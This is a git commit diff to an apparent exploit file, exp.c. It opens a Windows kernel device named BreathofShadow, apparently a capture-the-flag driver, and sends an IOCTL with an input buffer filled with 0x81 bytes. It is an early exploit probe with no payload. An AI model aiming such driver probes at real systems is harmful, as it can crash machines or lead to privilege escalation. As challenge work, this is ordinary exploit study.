b59de021a0f3e8e48be1fc2d890a62effd59fa22
Naup <naup96721@gmail.com>
2025-02-16 09:18:06 +0800

    a

--- exp.c
+++ exp.c
@@ -2,7 +2,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-#define IOCTL_TEST_CMD CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define DeVioctlCode 0x9C40240B
 #define DeviceName L"\\\\.\\BreathofShadow"
 
 void hexdump(const void* data, size_t size)
@@ -41,40 +41,46 @@ int main()
     HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 
     if (hDevice == INVALID_HANDLE_VALUE) {
-        printf("Failed to open device. Error: %ld\n", GetLastError());
+        printf("[X] Failed to open device. Error: %ld\n", GetLastError());
         return 1;
     }
 
+    printf("[!] Success open device");
+
     size_t* inputbuf = (size_t*)calloc(1, 0x100);
+
     if (inputbuf == NULL) {
-        printf("Memory allocation failed\n");
+        printf("[X] Memory allocation failed\n");
         CloseHandle(hDevice);
         return 1;
     }
 
-    char outputbuf[256] = { 0 };
+    memset(inputbuf, 0x81, 0x100);
+
+    char outputbuf[0x100] = { 0 };
+    
     DWORD bytesReturned = 0;
 
     BOOL result = DeviceIoControl(
         hDevice,
-        0x9C40240B,
+        DeVioctlCode,
         inputbuf,
         0x100,
-        (LPVOID)outputbuf,
+        outputbuf,
         sizeof(outputbuf),
         &bytesReturned,
         NULL
     );
 
-    if (result) {
-        printf("IOCTL command sent successfully\n");
-        hexdump(inputbuf, 0x100);
-    } else {
-        printf("Failed to send IOCTL command. Error: %ld\n", GetLastError());
-    }
+    // if (result) {
+    //     printf("IOCTL command sent successfully\n");
+    //     hexdump(inputbuf, 0x100);
+    // } else {
+    //     printf("Failed to send IOCTL command. Error: %ld\n", GetLastError());
+    // }
 
-    free(inputbuf);
-    CloseHandle(hDevice);
+    // free(inputbuf);
+    // CloseHandle(hDevice);
     return 0;
 }
 
